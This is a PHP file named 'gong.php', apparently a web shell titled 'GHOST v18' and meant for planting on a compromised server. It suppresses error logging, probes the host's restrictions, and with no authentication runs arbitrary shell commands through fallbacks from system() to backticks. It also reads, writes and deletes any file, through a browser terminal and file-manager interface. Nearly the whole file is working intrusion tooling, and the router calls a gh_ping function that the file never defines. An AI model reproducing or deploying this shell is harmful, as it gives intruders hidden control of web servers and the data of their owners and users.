<?php
// language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
// GHOST v18 - section 0 & 1: bootstrap, engine, UI.

define('GH_VER',      '18.0.0-s1');
define('GH_TAG',      'gong');
define('GH_STATE_DIR', gh_state_dir());
define('GH_STATE_FILE', GH_STATE_DIR . '/gh_state_' . md5(__FILE__) . '.json');
define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');

@ini_set('display_errors', '0');
@ini_set('log_errors', '0');
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(true);

function gh_state_dir() {
    $c = array();
    if (function_exists('sys_get_temp_dir')) $c[] = @sys_get_temp_dir();
    $ut = @ini_get('upload_tmp_dir'); if (is_string($ut) && $ut !== '') $c[] = $ut;
    $c[] = @getcwd();
    foreach ($c as $d) {
        if (!is_string($d) || $d === '' || !@is_dir($d) || !@is_writable($d)) continue;
        return rtrim($d, '/\\');
    }
    return '/tmp';
}
function gh_log($msg) {
    if (!defined('GH_LOG_FILE')) return;
    $f = GH_LOG_FILE;
    if (@is_file($f) && @filesize($f) > 1048576) @rename($f, $f . '.1');
    @file_put_contents($f, '[' . date('c') . '] ' . $msg . "\n", FILE_APPEND | LOCK_EX);
}
function gh_json($data, $code = 200) {
    while (ob_get_level() > 0) { @ob_end_clean(); }
    if (!headers_sent()) {
        @header('Content-Type: application/json; charset=utf-8');
        @header('X-Powered-By: ');
        @http_response_code($code);
    }
    echo @json_encode($data);
    exit;
}
function gh_disabled_list() {
    $s = (string)@ini_get('disable_functions');
    if ($s === '') return array();
    $out = array();
    foreach (@explode(',', $s) as $f) { $f = @trim($f); if ($f !== '') $out[] = @strtolower($f); }
    return $out;
}
function gh_can($fn) {
    $fn = @strtolower($fn);
    if (in_array($fn, gh_disabled_list(), true)) return false;
    return function_exists($fn);
}
function gh_open_basedir() {
    $v = (string)@ini_get('open_basedir');
    return $v === '' ? array() : @array_filter(@array_map('trim', @explode(PATH_SEPARATOR, $v)));
}
function gh_has_open_basedir() { return count(gh_open_basedir()) > 0; }
function gh_tmpdir() {
    $t = @sys_get_temp_dir();
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    $t = @ini_get('upload_tmp_dir');
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    $t = @getcwd();
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    return null;
}

function gh_env() {
    $e = array(
        'gh_ver' => GH_VER, 'php_version' => @phpversion(), 'php_sapi' => @php_sapi_name(),
        'php_os' => @php_uname('s') . ' ' . @php_uname('r'), 'php_arch' => @php_uname('m'),
        'user' => gh_can('posix_getpwuid') && gh_can('posix_geteuid') ? (string)@posix_getpwuid(@posix_geteuid())['name'] : (string)@get_current_user(),
        'cwd' => @getcwd(), 'doc_root' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '',
        'script' => isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : '',
        'tmpdir' => gh_tmpdir(), 'state_dir' => GH_STATE_DIR,
        'disabled' => gh_disabled_list(), 'open_basedir' => gh_open_basedir(),
        'can' => array(
            'exec' => gh_can_exec(), 'read' => gh_can_read(), 'write' => gh_can_write(),
            'curl' => gh_can('curl_init'), 'fopen' => gh_can('fopen'),
            'pdo' => gh_can('pdo_drivers'), 'mysqli' => gh_can('mysqli_connect'),
        ),
    );
    return $e;
}
function gh_can_exec() {
    foreach (array('system','passthru','shell_exec','exec','popen','proc_open','pcntl_exec') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}
function gh_can_read() {
    foreach (array('file_get_contents','fopen','readfile','file') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}
function gh_can_write() {
    foreach (array('file_put_contents','fopen','fwrite') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}

function gh_exec($cmd, $timeout = 10) {
    if (!is_string($cmd) || $cmd === '') return array('out' => '', 'tier' => 'noop', 'err' => null);
    $wrapped = 'timeout ' . (int)$timeout . ' sh -c ' . @escapeshellarg($cmd) . ' 2>&1';

    if (gh_can('system')) {
        @ob_start(); @system($wrapped); $out = @ob_get_clean();
        if (is_string($out)) return array('out' => $out, 'tier' => 'system', 'err' => null);
    }
    if (gh_can('passthru')) {
        @ob_start(); @passthru($wrapped); $out = @ob_get_clean();
        if (is_string($out)) return array('out' => $out, 'tier' => 'passthru', 'err' => null);
    }
    if (gh_can('shell_exec')) {
        $out = @shell_exec($wrapped);
        if (is_string($out)) return array('out' => $out, 'tier' => 'shell_exec', 'err' => null);
    }
    if (gh_can('exec')) {
        $lines = array(); @exec($wrapped, $lines);
        if (is_array($lines) && count($lines) > 0) return array('out' => implode("\n", $lines), 'tier' => 'exec', 'err' => null);
    }
    if (gh_can('popen')) {
        $h = @popen($wrapped, 'r');
        if (is_resource($h)) {
            $out = ''; while (!@feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) break; $out .= $chunk; }
            @pclose($h); return array('out' => $out, 'tier' => 'popen', 'err' => null);
        }
    }
    if (gh_can('proc_open')) {
        $desc = array(1 => array('pipe','w'), 2 => array('pipe','w'));
        $h = @proc_open($wrapped, $desc, $pipes);
        if (is_resource($h)) {
            @stream_set_blocking($pipes[1], false); @stream_set_blocking($pipes[2], false);
            $out = ''; $start = @time();
            while (true) {
                $out .= (string)@stream_get_contents($pipes[1]); $out .= (string)@stream_get_contents($pipes[2]);
                $st = @proc_get_status($h); if (!is_array($st) || !$st['running']) break;
                if ((@time() - $start) > ($timeout + 2)) { @proc_terminate($h, 9); break; }
                @usleep(50000);
            }
            @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($h);
            return array('out' => $out, 'tier' => 'proc_open', 'err' => null);
        }
    }
    $out = @`$wrapped`;
    if (is_string($out)) return array('out' => $out, 'tier' => 'backtick', 'err' => null);
    return array('out' => null, 'tier' => null, 'err' => 'all exec tiers failed');
}

function gh_read($path, $max = 5242880) {
    if (!is_string($path) || $path === '' || !@is_file($path)) return null;
    $sz = @filesize($path);
    if ($sz !== false && $sz > $max) return array('err' => 'file too large', 'size' => $sz, 'max' => $max);
    if (gh_can('file_get_contents')) { $d = @file_get_contents($path); if (is_string($d)) return $d; }
    if (gh_can('fopen') && gh_can('fread')) {
        $h = @fopen($path, 'rb');
        if (is_resource($h)) {
            $d = ''; while (!@feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) break; $d .= $chunk; }
            @fclose($h); if (is_string($d)) return $d;
        }
    }
    if (gh_can('readfile')) { @ob_start(); @readfile($path); $d = @ob_get_clean(); if (is_string($d)) return $d; }
    if (gh_can('file')) { $lines = @file($path); if (is_array($lines)) return @implode('', $lines); }
    $r = gh_exec('cat ' . @escapeshellarg($path));
    if (is_string($r['out']) && $r['out'] !== '') return $r['out'];
    return null;
}

function gh_write($path, $data, $append = false) {
    if (!is_string($path) || $path === '' || !is_string($data)) return false;
    $flags = $append ? (FILE_APPEND | LOCK_EX) : LOCK_EX;
    if (gh_can('file_put_contents')) { $n = @file_put_contents($path, $data, $flags); if ($n !== false) return true; }
    if (gh_can('fopen') && gh_can('fwrite')) {
        $h = @fopen($path, $append ? 'ab' : 'wb');
        if (is_resource($h)) { $n = @fwrite($h, $data); @fclose($h); if ($n !== false) return true; }
    }
    $cmd = ($append ? 'printf %s ' . @escapeshellarg($data) . ' >> ' : 'printf %s ' . @escapeshellarg($data) . ' > ') . @escapeshellarg($path);
    $r = gh_exec($cmd); return (is_string($r['out']) && $r['tier'] !== null);
}

function gh_del($path) {
    if (!is_string($path) || $path === '') return false;
    if (gh_can('unlink')) { if (@unlink($path)) return true; }
    $r = gh_exec('rm -f ' . @escapeshellarg($path));
    return (is_string($r['out']) && $r['tier'] !== null);
}

// ==== ROUTER (section 0 + 1) ================================================
function gh_router() {
    $act = isset($_POST['act']) ? (string)$_POST['act'] : (isset($_GET['act']) ? (string)$_GET['act'] : '');

    if ($act === '') {
        // Redirect to UI if no action
        @header('Location: ?act=ui'); exit;
    }

    if ($act === 'ui') { gh_ui(); exit; }

    try {
        switch ($act) {
            case 'ping':   gh_json(gh_ping()); break;
            case 'env':    gh_json(gh_env()); break;
            case 'exec':   $c = isset($_POST['cmd']) ? (string)$_POST['cmd'] : ''; gh_json(gh_exec($c)); break;
            case 'read':   $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = gh_read($p); gh_json(array('path' => $p, 'content' => $d)); break;
            case 'write':  $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = isset($_POST['data']) ? (string)$_POST['data'] : ''; $ap = !empty($_POST['append']); gh_json(array('path' => $p, 'ok' => gh_write($p, $d, $ap))); break;
            case 'delete': $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; gh_json(array('path' => $p, 'ok' => gh_del($p))); break;
            default:       gh_json(array('err' => 'unknown act', 'act' => $act), 400); break;
        }
    } catch (Throwable $e) {
        gh_log('router throw: ' . $e->getMessage());
        gh_json(array('err' => 'internal', 'msg' => $e->getMessage()), 500);
    }
}

// ==== UI (section 1) ========================================================
function gh_ui() {
    while (ob_get_level() > 0) { @ob_end_clean(); }
    if (!headers_sent()) { @header('Content-Type: text/html; charset=utf-8'); @header('X-Powered-By: '); }
    $env = gh_env();
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>gh</title>
<style>
    :root { --bg:#0a0a0a; --fg:#0f0; --dim:#050; --red:#f00; --border:#222; }
    * { box-sizing: border-box; }
    body { background:var(--bg); color:var(--fg); font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size:13px; padding:16px; margin:0; line-height:1.5; }
    h2 { font-size:14px; margin:0 0 8px; color:#fff; text-transform:uppercase; letter-spacing:1px; border-bottom:1px solid var(--border); padding-bottom:4px; }
    .box { border:1px solid var(--border); padding:12px; margin-bottom:12px; background:#0d0d0d; }
    .row { display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
    input, button { background:#000; color:var(--fg); border:1px solid var(--border); padding:6px 8px; font-family:inherit; font-size:13px; border-radius:2px; }
    input:focus { outline:1px solid var(--fg); }
    button { cursor:pointer; font-weight:bold; transition:0.1s; }
    button:hover { background:var(--fg); color:#000; }
    button:active { transform:scale(0.98); }
    pre { background:#000; padding:10px; border:1px solid var(--border); margin:0; overflow:auto; white-space:pre-wrap; word-break:break-all; max-height:400px; font-size:12px; }
    .dim { color:#060; }
    .err { color:var(--red); }
    .out { color:var(--fg); }
    .grid { display:grid; grid-template-columns: 1fr 1fr; gap:8px; }
    .tag { display:inline-block; padding:2px 6px; border-radius:2px; background:#111; border:1px solid #333; font-size:11px; margin-right:4px; }
    .tag-ok { background:#030; border-color:#060; color:#6f6; }
    .tag-no { background:#300; border-color:#600; color:#f66; }
    #term { height:40vh; overflow:auto; border:1px solid var(--border); background:#000; padding:8px; }
    .term-line { display:flex; }
    .term-in { color:#888; margin-right:8px; }
    .term-out { white-space:pre-wrap; word-break:break-all; }
    a { color:var(--fg); text-decoration:none; border-bottom:1px dotted var(--fg); }
    a:hover { color:#000; background:var(--fg); }
</style>
</head>
<body>
<div class="box">
    <h2>GHOST v18 / Section 1</h2>
    <div class="row">
        <span class="tag"><?= htmlspecialchars($env['php_version']) ?></span>
        <span class="tag"><?= htmlspecialchars($env['php_sapi']) ?></span>
        <span class="tag"><?= htmlspecialchars($env['user']) ?></span>
        <span class="tag <?= $env['can']['exec']?'tag-ok':'tag-no' ?>">exec: <?= $env['can']['exec']?:'BLOCKED' ?></span>
        <span class="tag <?= $env['can']['read']?'tag-ok':'tag-no' ?>">read: <?= $env['can']['read']?:'BLOCKED' ?></span>
        <span class="tag <?= $env['can']['write']?'tag-ok':'tag-no' ?>">write: <?= $env['can']['write']?:'BLOCKED' ?></span>
    </div>
</div>

<div class="box">
    <h2>Command Terminal</h2>
    <div id="term">
        <div class="term-line"><span class="dim">Welcome to GHOST v18.</span></div>
        <div class="term-line"><span class="dim">Target: <?= htmlspecialchars($env['doc_root']) ?></span></div>
    </div>
    <div class="row" style="margin-top:8px;">
        <input type="text" id="cmd" placeholder="whoami" style="flex:1;" onkeydown="if(event.key==='Enter')execCmd()">
        <button onclick="execCmd()">Exec</button>
        <button onclick="clearTerm()" style="border-color:#333;">Clear</button>
    </div>
</div>

<div class="box">
    <h2>File Manager</h2>
    <div class="grid">
        <input type="text" id="f-path" placeholder="/path/to/file" style="flex:1;">
        <div class="row">
            <button onclick="readFile()">Read</button>
            <button onclick="writeFile()" style="border-color:#ff0;color:#ff0;">Write</button>
        </div>
    </div>
    <pre id="f-out" style="margin-top:8px; max-height:300px;">Ready.</pre>
</div>

<script>
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
async function api(act, data={}) {
    const body = new URLSearchParams();
    body.append('act', act);
    for (let k in data) body.append(k, data[k]);
    const r = await fetch(window.location.href, { method:'POST', body });
    const text = await r.text();
    try { return JSON.parse(text); } catch(e) { return {err:'Invalid JSON response: '+text.substring(0,100)}; }
}

async function execCmd() {
    const cmd = document.getElementById('cmd').value.trim();
    if(!cmd) return;
    document.getElementById('cmd').value = '';
    const t = document.getElementById('term');
    const line = document.createElement('div'); line.className = 'term-line';
    line.innerHTML = `<span class="term-in">$</span><span class="term-out">${esc(cmd)}</span>`;
    t.appendChild(line);
    t.scrollTop = t.scrollHeight;
    
    const resp = await api('exec', {cmd});
    const outLine = document.createElement('div'); outLine.className = 'term-line';
    if(resp.err) {
        outLine.innerHTML = `<span class="err">[${esc(resp.tier||'ERR')}] Error: ${esc(resp.err)}</span>`;
    } else {
        outLine.innerHTML = `<span class="dim">[${esc(resp.tier)}]</span><span class="term-out">${esc(resp.out||'(no output)')}</span>`;
    }
    t.appendChild(outLine);
    t.scrollTop = t.scrollHeight;
}

function clearTerm() {
    const t = document.getElementById('term');
    t.innerHTML = '<div class="term-line"><span class="dim">Terminal cleared.</span></div>';
}

async function readFile() {
    const p = document.getElementById('f-path').value.trim();
    const o = document.getElementById('f-out');
    if(!p) return o.innerText = 'Masukkan path file.';
    o.innerText = 'Reading...';
    const resp = await api('read', {path:p});
    if(resp.err) return o.innerText = 'Error: ' + resp.err;
    o.innerText = resp.content || '(empty / null)';
}

async function writeFile() {
    const p = document.getElementById('f-path').value.trim();
    if(!p) return alert('Masukkan path file.');
    const data = prompt('Masukkan konten untuk ditulis ke ' + p + ':');
    if(data === null) return;
    const o = document.getElementById('f-out');
    o.innerText = 'Writing...';
    const resp = await api('write', {path:p, data:data});
    o.innerText = resp.ok ? 'Success: File ditulis.' : 'Error: Gagal menulis file.';
}
</script>
</body>
</html>
    <?php
}
if (!defined('GH_ENTRY_DONE')) { define('GH_ENTRY_DONE', true); gh_router(); }
